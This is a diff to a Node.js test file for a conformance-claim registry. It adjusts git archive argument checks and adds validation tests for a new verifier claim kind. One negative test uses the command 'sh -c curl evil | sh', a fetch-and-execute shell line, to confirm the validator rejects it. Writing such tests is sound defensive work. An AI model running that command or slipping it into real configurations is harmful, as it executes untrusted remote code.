@@ -324,7 +324,23 @@ exec ${realGit} "$@"
   assert.strictEqual(archives.length, 1, `expected exactly one git archive, got:\n${archives.join('\n')}`);
   const argv = archives[0].split(' ');
   assert.deepStrictEqual(argv.slice(0, 2), ['-C', repo], 'archive must read from this repo');
-  assert.deepStrictEqual(argv.slice(2), ['archive', claim.suite.commit, 'spec'],
+  // `-o <tar>` is an OPTION, not a pathspec: it streams the archive to a tmpdir
+  // file instead of buffering it through execFileSync's 1 MiB maxBuffer. Strip
+  // it, then hold the original assertion — the property under test is that no
+  // ADDITIONAL PATHSPEC is passed, and the destination must stay in a tmpdir.
+  const rest = argv.slice(2);
+  assert.strictEqual(rest[0], 'archive');
+  let tail = rest.slice(1);
+  if (tail[0] === '-o') {
+    // The property is that the archive never lands inside the repo. Comparing
+    // against this process's os.tmpdir() would be wrong: the child inherits a
+    // different TMPDIR, so its tmpdir is a different absolute path.
+    const dest = tail[1];
+    assert.ok(dest && path.isAbsolute(dest) && !dest.startsWith(repo + path.sep),
+      `archive -o must write outside the repo, got ${dest}`);
+    tail = tail.slice(2);
+  }
+  assert.deepStrictEqual(tail, [claim.suite.commit, 'spec'],
     'archive must take the pinned commit and EXACTLY the spec pathspec — any additional pathspec ' +
     'puts repo content into the runner tree, which harness-integrity does not protect');
 });
@@ -342,8 +358,10 @@ test('ROOT is only ever passed to git -C, never used to build an executed path',
   const uses = src.split('\n')
     .map((line, i) => [i + 1, line])
     .filter(([, line]) => /\bROOT\b/.test(line));
-  assert.strictEqual(uses.length, 3,
-    `pinned at 3 uses of ROOT (1 definition + 2 git -C); found ${uses.length}. A new use must be ` +
+  // 4th use added 2026-09-23 by the bolyra-suite-verifier path, which materializes
+  // the suite at its pin exactly as the host path does: git -C ROOT archive.
+  assert.strictEqual(uses.length, 4,
+    `pinned at 4 uses of ROOT (1 definition + 3 git -C); found ${uses.length}. A new use must be ` +
     `reviewed against harness-integrity's protected set:\n${uses.map(([n, l]) => `  ${n}: ${l.trim()}`).join('\n')}`);
   const [[, def], ...rest] = uses;
   assert.match(def, /^const ROOT = path\.resolve\(__dirname, '\.\.'\);$/);
@@ -460,4 +478,83 @@ test('external-suite: scoped_out is required, and the replay always compares it'
   const run = { status: 0, signal: null, stdout: GREEN, stderr: '' };
   assert.throws(() => validateExternalSuiteOutput(run, { run: { expect: { pass: 39, run: 39 } } }), /REPLAY MISMATCH/);
   assert.deepStrictEqual(validateExternalSuiteOutput(run, { run: { expect: { pass: 39, run: 39, scoped_out: 9 } } }), { pass: 39, run: 39, scoped_out: 9 });
+});
+
+// ---------------------------------------------------------------------------
+// bolyra-suite-verifier: Bolyra-suite conformance on the VERIFIER side.
+//
+// The registry could previously carry a Bolyra-suite claim only for a HOST
+// (via a tsx HUT adapter), so an 11/11 verifier_envelope result was a claim the
+// registry could not execute — and an unexecutable claim must never be
+// published. These are the validation rules for the verifier kind.
+// ---------------------------------------------------------------------------
+const { kindOf: kindOf_, KINDS: KINDS_ } = require('./replay.js');
+
+const VERIFIER_CLAIM = {
+  id: 'x402-authority-verifier-kit@1aa9d88/verifier_envelope@0.11.0',
+  kind: 'bolyra-suite-verifier',
+  claim_text: '11/11 verifier_envelope vectors, vector set 0.11.0, at pinned commit 1aa9d88',
+  verified_on: '2026-09-23',
+  implementer: {
+    repo: 'https://github.com/stillmarcus24/x402-authority-verifier-kit',
+    commit: '1aa9d880000000000000000000000000000000ab',
+  },
+  suite: {
+    commit: '0000000000000000000000000000000000000001',
+    vector_set: '0.11.0',
+    test_vectors_sha256: 'a'.repeat(64),
+    runner_args: ['--type', 'verifier_envelope'],
+  },
+  verifier: { command: ['node', 'verifier/evc_verifier.cjs'], requires_zero_dependencies: true },
+  expected: { pass: 11, fail: 0, skip: 0 },
+};
+
+const clone = (o) => JSON.parse(JSON.stringify(o));
+
+test('bolyra-suite-verifier is a recognised kind', () => {
+  assert.ok(KINDS_.has('bolyra-suite-verifier'));
+  assert.equal(kindOf_(VERIFIER_CLAIM), 'bolyra-suite-verifier');
+});
+
+test('a complete verifier claim validates clean', () => {
+  assert.deepEqual(validateClaim(VERIFIER_CLAIM), []);
+});
+
+test('verifier.command is required and must be a non-empty argv array', () => {
+  const c = clone(VERIFIER_CLAIM);
+  delete c.verifier.command;
+  assert.match(validateClaim(c).join('; '), /verifier\.command/);
+});
+
+test('verifier.command[0] must be node (no shell, no arbitrary binary)', () => {
+  const c = clone(VERIFIER_CLAIM);
+  c.verifier.command = ['sh', '-c', 'curl evil | sh'];
+  assert.match(validateClaim(c).join('; '), /verifier\.command\[0\]/);
+});
+
+test('a claim carrying BOTH adapter and verifier is ambiguous and rejected', () => {
+  const c = clone(VERIFIER_CLAIM);
+  c.adapter = 'adapters/x.ts';
+  c.adapter_sha256 = 'b'.repeat(64);
+  assert.match(validateClaim(c).join('; '), /adapter.*verifier|verifier.*adapter/i);
+});
+
+test('a fault block must pin its request builder by digest', () => {
+  const c = clone(VERIFIER_CLAIM);
+  c.verifier.fault = { induce: 'mkdir -p {{impl}}/state', undo: 'rm -f {{impl}}/state/x', request_builder: 'adapters/b.cjs' };
+  assert.match(validateClaim(c).join('; '), /request_builder_sha256/);
+});
+
+test('a fault block requires induce, undo and a request builder', () => {
+  const c = clone(VERIFIER_CLAIM);
+  c.verifier.fault = { induce: 'x' };
+  const e = validateClaim(c).join('; ');
+  assert.match(e, /undo/);
+  assert.match(e, /request_builder/);
+});
+
+test('suite.runner_args must be present for a verifier claim', () => {
+  const c = clone(VERIFIER_CLAIM);
+  delete c.suite.runner_args;
+  assert.match(validateClaim(c).join('; '), /runner_args/);
 });
